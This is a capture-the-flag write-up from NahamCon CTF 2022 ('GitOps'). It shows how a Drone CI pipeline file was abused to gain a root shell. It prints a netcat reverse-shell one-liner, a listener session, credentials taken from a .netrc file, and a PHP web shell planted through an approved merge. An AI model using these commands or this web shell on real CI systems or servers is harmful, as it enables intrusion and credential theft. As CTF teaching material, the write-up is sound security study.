<h3 id="stripped-output-response"><a href="#stripped-output-response" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stripped output Response</h3>
<p>We only keep the most relevant data, to keep this list smaller but we had every binary on the default Environment Path</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">+ uname -a
</span><span class="code-line">Linux gitops-5edbd6bd8fd79ba1-c77694485-8gjlx 5.4.144+ #1 SMP Wed Nov 3 09:56:10 PDT 2021 x86_64 Linux
</span><span class="code-line">
</span><span class="code-line">+ cat /etc/issue
</span><span class="code-line">Welcome to Alpine Linux 3.15
</span><span class="code-line">Kernel \r on an \m (\l)
</span><span class="code-line">
</span><span class="code-line">+ find $(echo $PATH | sed &#x27;s/:/ /g&#x27;)
</span><span class="code-line">/usr/local/bin/php
</span><span class="code-line">/usr/bin/wget
</span><span class="code-line">/usr/bin/nc
</span><span class="code-line">/usr/bin/whoami
</span><span class="code-line">/usr/bin/mkfifo
</span><span class="code-line">/usr/bin/git
</span><span class="code-line">/usr/bin/git-receive-pack
</span><span class="code-line">/usr/bin/git-upload-pack
</span><span class="code-line">/usr/bin/git-upload-archive
</span><span class="code-line">/usr/bin/git-shell
</span><span class="code-line">/usr/bin/curl
</span><span class="code-line">/bin/sh
</span><span class="code-line">/bin/base64
</span><span class="code-line">/bin/mktemp
</span><span class="code-line">/bin/ash
</span><span class="code-line">/bin/busybox
</span><span class="code-line">
</span><span class="code-line">+ find / -perm /o+w -type d
</span><span class="code-line">/var/tmp
</span><span class="code-line">/var/www/html
</span><span class="code-line">/dev/shm
</span><span class="code-line">/tmp
</span></code></pre></div>
<h3 id="key-points"><a href="#key-points" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Key Points</h3>
<ul>
<li>
<p>We do not have <code>bash</code> but we have access to <code>ash</code> and <code>sh</code></p>
</li>
<li>
<p>We can write in the <code>/tmp</code> folder</p>
</li>
<li>
<p>No <code>python</code>, but <code>Perl</code> and <code>nc</code> are present</p>
</li>
<li>
<p>Running Alpine Linux 3.15, which is a based on busybox, so limited commands</p>
</li>
<li>
<p>x86_64 Linux If we would like to compile executable for the target</p>
</li>
<li>
<p>We could use the Git CLI from this box to interact with the Repo instead of the Web UI</p>
</li>
</ul>
<h3 id="generating-the-payload"><a href="#generating-the-payload" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Generating the payload</h3>
<p>With these information, there are multiple ways of gaining a remote shell on the target computer, we choose the following payload for this challenge, repeat the previous steps and include it in <code>drone.yml</code></p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc x.x.x.x 80 &gt;/tmp/f
</span></code></pre></div>
<p>Start a listener on the selected port and catch the reverse shell with <code>nc -lnvp 80</code></p>
<div class="relative"><pre><code class="language-shell code-highlight"><span class="code-line">$ <span class="token function">nc</span> -lnvp <span class="token number">80</span>
</span><span class="code-line">listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">80</span> <span class="token punctuation">..</span>.
</span><span class="code-line">connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.0.181<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.149<span class="token punctuation">]</span> <span class="token number">51978</span>
</span><span class="code-line">/bin/ash: can&#x27;t access <span class="token function">tty</span><span class="token punctuation">;</span> job control turned off
</span><span class="code-line">/tmp/drone-u2aFxfYSGZ02aua6/done/src <span class="token comment"># whoami &amp;&amp; id &amp;&amp; ip a</span>
</span><span class="code-line">root
</span><span class="code-line"><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">(</span>bin<span class="token punctuation">)</span>,2<span class="token punctuation">(</span>daemon<span class="token punctuation">)</span>,3<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,6<span class="token punctuation">(</span>disk<span class="token punctuation">)</span>,10<span class="token punctuation">(</span>wheel<span class="token punctuation">)</span>,11<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,20<span class="token punctuation">(</span>dialout<span class="token punctuation">)</span>,26<span class="token punctuation">(</span>tape<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>video<span class="token punctuation">)</span>
</span><span class="code-line"><span class="token number">1</span>: lo: <span class="token operator">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="token operator">&gt;</span> mtu <span class="token number">65536</span> qdisc noqueue state UNKNOWN qlen <span class="token number">1000</span>
</span><span class="code-line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span><span class="code-line">    inet <span class="token number">127.0</span>.0.1/8 scope <span class="token function">host</span> lo
</span><span class="code-line">        valid_lft forever preferred_lft forever
</span><span class="code-line"><span class="token number">2</span>: eth0@if2010: <span class="token operator">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN<span class="token operator">&gt;</span> mtu <span class="token number">1040</span> qdisc noqueue state UP 
</span><span class="code-line">    link/ether ea:9c:38:bf:2f:e6 brd ff:ff:ff:ff:ff:ff
</span><span class="code-line">    inet <span class="token number">10.112</span>.9.241/32 brd <span class="token number">10.112</span>.9.241 scope global eth0
</span><span class="code-line">        valid_lft forever preferred_lft forever
</span><span class="code-line">/tmp/drone-u2aFxfYSGZ02aua6/done/src <span class="token comment">#</span>
</span></code></pre></div>
<h2 id="post-exploitation"><a href="#post-exploitation" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Post Exploitation</h2>
<p>Looking around the system, we found a really interesting file in the <em>Docker DroneCi Home folder</em> named <code>.netrc</code>, we took a look inside, we had credentials for another user. We tried them against the Gitea application and successfully logged in as <em>DroneCI</em>:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">/tmp/drone-u2aFxfYSGZ02aua6/home/drone # cat .netrc
</span><span class="code-line">machine git.challenge.nahamcon.com login droneci password t4K0@s!qSF
</span><span class="code-line">/tmp/drone-u2aFxfYSGZ02aua6/home/drone #
</span></code></pre></div>
<h2 id="pivoting-to-web-server"><a href="#pivoting-to-web-server" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Pivoting to Web Server</h2>
<p>Remember in the <code>README.md</code>, we had to get someone else to approve our code before it gets merged into the Master Branch. We will use our newly discovered account to approve our malicious commit.</p>
<p>We will add a simple command execution form in the <code>index.php</code> file, and I always like to put a <code>phpinfo();</code>, This ways, if per example <code>system()</code> command is disabled on the server, with the <code>phpinfo</code>, I will be able to confirm I can execute PHP code, and you should be able to view which functions are restricted and tons of useful information on the target.</p>
<div class="relative"><pre><code class="language-php code-highlight"><span class="code-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>GET<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token global">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#x27;PHP_SELF&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>TEXT<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cmd<span class="token punctuation">&quot;</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>cmd<span class="token punctuation">&quot;</span></span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>80<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</span><span class="code-line">  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>SUBMIT<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Execute<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</span><span class="code-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
</span></span><span class="code-line"><span class="token php language-php">    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#x27;cmd&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></span><span class="code-line"><span class="token php language-php">    <span class="token punctuation">{</span>
</span></span><span class="code-line"><span class="token php language-php">        <span class="token function">system</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#x27;cmd&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="code-line"><span class="token php language-php">    <span class="token punctuation">}</span>
</span></span><span class="code-line"><span class="token php language-php"><span class="token delimiter important">?&gt;</span></span>
</span><span class="code-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">&gt;</span></span>
</span><span class="code-line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
</span></span><span class="code-line"><span class="token php language-php">    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="code-line"><span class="token php language-php"><span class="token delimiter important">?&gt;</span></span>
</span><span class="code-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">&gt;</span></span>
</span></code></pre></div>
<ul>
<li>
<p>Repeat previous steps to modify <code>drone.yml</code> but instead change <code>index.php</code>, Once the commit is made, you need to ask for a pull request</p>
<p><img src="/static/images/nahamcon-ctf-2022/gitops/PullRequest.png" alt="Create Pull Request"/></p>
</li>
<li>
<p>Then Disconnect from the <em>developer</em> account and connect with the credentials founds previously <code>droneci:t4K0@s!qSF</code></p>
</li>
<li>
<p>We now need to peer review the commit from <em>developer</em> account asking to be merged into master</p>
<p><img src="/static/images/nahamcon-ctf-2022/gitops/peer_review.png" alt="Approve Commit made by Developer"/></p>
</li>
<li>
<p>Now the final step, we need to actually create a merge commit to the master branch</p>
<p><img src="/static/images/nahamcon-ctf-2022/gitops/Merge.png" alt="Merged to master branch"/></p>
</li>
</ul>
<h3 id="confirm-the-malicious-indexphp-has-been-pushed-to-the-webserver"><a href="#confirm-the-malicious-indexphp-has-been-pushed-to-the-webserver" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Confirm the malicious <code>index.php</code> has been pushed to the webserver</h3>
<p>Now is the final check, Cross your fingers and navigate to <code>Web.challenge.nahamcon.com</code>.</p>
<p><img src="/static/images/nahamcon-ctf-2022/gitops/phpinfo.png" alt="Reverse Shell Testing"/></p>
<p>At first, we thought me might need to find some privilege escalation vulnerability on the web server to gain root access then grab the flag, we create a reverse shell from the Webserver, but after quick enumeration, we found the flag on the system root and were able to read it with user <code>www-data</code>. So instead of creating a new reverse shell, you can use <code>find</code> and <code>cat</code> to grab the flag.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">find / -name *.txt -type f
</span><span class="code-line">cat /flag.txt
</span></code></pre></div>
<p><img src="/static/images/nahamcon-ctf-2022/gitops/find_flag.png" alt="Finding the flag"/>
<img src="/static/images/nahamcon-ctf-2022/gitops/flag.png" alt="Grabbing the Flag"/></p></div><div class="pt-6 pb-6 text-sm text-gray-700 dark:text-gray-300"><a target="_blank" rel="nofollow" href="https://mobile.twitter.com/search?q=https%3A%2F%2Fsekai.team%2Fblog%2Fnahamcon-ctf-2022%2Fgitops">Discuss on Twitter</a> • <a target="_blank" rel="noopener noreferrer" href="https://github.com/blueset/sekai.team/blob/master/data/blog/nahamcon-ctf-2022/gitops.md">View on GitHub</a></div></div><footer><div class="text-sm font-medium leading-5 divide-gray-200 xl:divide-y dark:divide-gray-700 xl:col-start-1 xl:row-start-2"><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/nahamcon-ctf-2022/">NahamCon-CTF-2022</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/misc/">Misc</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/devops/">DevOps</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/git/">Git</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/pipeline/">Pipeline</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/gitea/">Gitea</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/droneci/">DroneCI</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/crew-ctf-2022/EzChall/">Crew CTF 2022 – EzChall &amp; EzChall Again</a></div></div><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/sdctf-2022/crypto-roll/">San Diego CTF 2022 – Tasty Crypto Roll</a></div></div></div></div><div class="pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog/">← Back to the blog</a></div></footer></div></div></article></div></main><footer><div class="flex flex-col items-center mt-16"><div class="flex mb-3 space-x-4"><div class="flex mb-3 space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:project.sekai@sekai.team"><span class="sr-only"><span class="w-6">mail</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/project-sekai-ctf"><span class="sr-only"><span class="w-6">github</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/company/project-sekai-ctf/"><span class="sr-only"><span class="w-6">linkedin</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/ProjectSEKAIctf"><span class="sr-only"><span class="w-6">twitter</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 0 1-2.228-.616v.06a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.936 4.936 0 0 0 4.604 3.417 9.867 9.867 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0 0 24 4.59z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://ctftime.org/team/169557"><span class="sr-only"><span class="w-6">ctftime</span></span><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M24 0v24H0V0h24Zm-3.077 3.077L7.067 3.076 16 12.816 10.369 19l-2.195-2.612 3.476-3.573-8.574-9.609v17.717h17.847V3.077Z" fill="currentColor" fill-rule="evenodd"></path></svg></a></div></div><div class="flex mb-2 space-x-2 text-sm text-gray-500 dark:text-gray-400"><a href="/">Project SEKAI</a><div> • </div><div>© 2024</div><div> • </div><div><a href="https://1a23.com">1A23 Studio</a></div></div><div class="mb-8 text-xs text-center text-gray-200 dark:text-gray-700">This website is in no way affiliated with any of the following individuals or organizations.<!-- --> <a target="_blank" rel="noopener noreferrer" href="https://github.com/timlrx/tailwind-nextjs-starter-blog">Tailwind Nextjs Theme</a> © Timothy Lim and contributors; <a target="_blank" rel="noopener noreferrer" href="https://pjsekai.sega.jp/">Project SEKAI: Colorful Stage! feat. Hatsune Miku</a> © SEGA / © Craft Egg Inc. Developed by Colorful Palette; <a target="_blank" rel="noopener noreferrer" href="https://ec.crypton.co.jp/pages/prod/virtualsinger">Character Vocal Series</a> © Crypton Future Media, INC. <a target="_blank" rel="noopener noreferrer" href="https://www.piapro.net">www.piapro.net</a> All rights reserved.</div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"mdxSource":"var Component=(()=\u003e{var r=Object.create;var t=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var h=Object.getOwnPropertyNames;var p=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var i=a=\u003et(a,\"__esModule\",{value:!0});var u=(a,s)=\u003e()=\u003e(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=\u003e{i(a);for(var c in s)t(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=\u003e{if(s\u0026\u0026typeof s==\"object\"||typeof s==\"function\")for(let n of h(s))!m.call(a,n)\u0026\u0026n!==\"default\"\u0026\u0026t(a,n,{get:()=\u003es[n],enumerable:!(c=d(s,n))||c.enumerable});return a},g=a=\u003ek(i(t(a!=null?r(p(a)):{},\"default\",a\u0026\u0026a.__esModule\u0026\u0026\"default\"in a?{get:()=\u003ea.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=u((x,l)=\u003e{l.exports=_jsx_runtime});var v={};N(v,{default:()=\u003ew,frontmatter:()=\u003ef});var e=g(o()),f={title:\"NahamCon CTF 2022 \\u2013 GitOps\",date:\"2022-05-02\",draft:!1,authors:[\"TheButcher\"],tags:[\"NahamCon CTF 2022\",\"Misc\",\"DevOps\",\"Git\",\"Pipeline\",\"Gitea\",\"DroneCI\"],summary:\"Abuse the pipeline execution process to gain access to the host.\"};function b(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(c,{})})):c();function c(){let n=Object.assign({h1:\"h1\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",code:\"code\",br:\"br\",h2:\"h2\",ul:\"ul\",li:\"li\",em:\"em\",img:\"img\",strong:\"strong\",pre:\"pre\",h3:\"h3\"},a.components);return(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h1,{id:\"gitops\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#gitops\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"GitOps\"]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Challenge Author: @congon4tor#2334\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"Someone leaked their git credentials (\",(0,e.jsx)(n.code,{children:\"developer:2!W4S5J$6e\"}),\"). How deep can you infiltrate?\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"This challenge uses vhosts.\",(0,e.jsx)(n.br,{}),`\n`,\"Visit git.challenge.nahamcon.com:[YOUR_PORT]\",(0,e.jsx)(n.br,{}),`\n`,\"Visit drone.challenge.nahamcon.com:[YOUR_PORT]\",(0,e.jsx)(n.br,{}),`\n`,\"Visit web.challenge.nahamcon.com:[YOUR_PORT]\"]}),`\n`]}),`\n`,(0,e.jsxs)(n.h2,{id:\"challenge-summary\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#challenge-summary\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Challenge Summary\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"In this challenge, we are given 3 different services to attack. There is an automated process that pushes the Master Branch of the Git Repository to the main webserver of the organisation. To complete this challenge, we will need to create a new commit with a modified DroneCI configuration file to abuse the pipeline execution process to gain access to the host running DroneCI and Gitea. Once on that host, we can find some credentials for another user allowed to review codes written by peers. With these information, we can inject malicious code in \",(0,e.jsx)(n.code,{children:\"index.php\"}),\" by creating a new commit with the developer account and use the DroneCI account to approve and merge the malicious commit on the Master Branch. Our malicious Master Branch will then be pushed to the WebServer, and we are now able to gain code execution and grab the flag.\"]}),`\n`,(0,e.jsxs)(n.h2,{id:\"initial-reconnaissance\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#initial-reconnaissance\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Initial Reconnaissance\"]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.code,{children:\"Git.challenge.nahamcon.com\"})}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"We can confirm that the application version with the page footer: \",(0,e.jsx)(n.em,{children:\"Powered by Gitea Version: 1.16.0\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"We have valid credentials given by the challenge creator \",(0,e.jsx)(n.code,{children:\"developer:2!W4S5J$6e\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"Once loggedIn, we have access to only 1 private repository, there is no public one, and we cannot create a new one \",(0,e.jsx)(n.em,{children:\"(Limit set to 0)\"})]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/repository.png\",alt:\"Web Repository main page\"}),`\n`,(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/readme.png\",alt:\"ReadMe Screenshot\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.code,{children:\"Drone.challenge.nahamcon.com\"})}),`\n`,(0,e.jsx)(n.p,{children:\"After some quick research, we can understand that drone is the application that automates the process to keep the webserver up to date.\"}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"Drone by Harness\\u2122 is a modern Continuous Integration platform that empowers busy teams to automate their build, test and release workflows using a powerful, cloud native pipeline engine. \",(0,e.jsx)(n.em,{children:(0,e.jsx)(n.a,{href:\"https://docs.drone.io/\",children:\"https://docs.drone.io/\"})})]}),`\n`]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"Navigating the docs, we found an interesting feature, \",(0,e.jsx)(n.a,{href:\"https://docs.drone.io/pipeline/exec/overview/\",children:(0,e.jsx)(n.strong,{children:\"Exec Pipeline\"})}),\".\"]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"An exec pipeline executes shell commands directly on the host machine without isolation. This is useful for workloads that need to run on the host, or are poorly suited for execution inside containers.\"}),`\n`]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"The \",(0,e.jsx)(n.code,{children:\"Drone.yml\"}),\" file in the web repository is probably the drone config file. And from the \",(0,e.jsx)(n.code,{children:\"README.md\"}),\" we can assume it gets run when we make a pull request to ensure our new code passes all the required checks.\"]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.code,{children:\"Web.challenge.nahamcon.com\"})}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"This is the webserver, in the \",(0,e.jsx)(n.code,{children:\"ReadMe.md\"}),\" from the Web repository, we learned that every minute, the GitOps system will push the \",(0,e.jsx)(n.code,{children:\"master\"}),\" branch to this server.\"]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Our gitops system will pull your changes every minute and update the website automatically.\"}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:\"We can assume this is the server containing the flag.\"}),`\n`]}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h2,{id:\"testing-for-remote-code-execution\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#testing-for-remote-code-execution\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Testing for Remote Code Execution\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"In our initial test, we tried to contact a webhook from \",(0,e.jsx)(n.a,{href:\"https://webhook.site/\",children:\"https://webhook.site/\"}),\". We added the following code to \",(0,e.jsx)(n.code,{children:\"drone.yml\"}),\".\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-yaml\",children:(0,e.jsxs)(n.code,{className:\"language-yaml code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# ...\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token 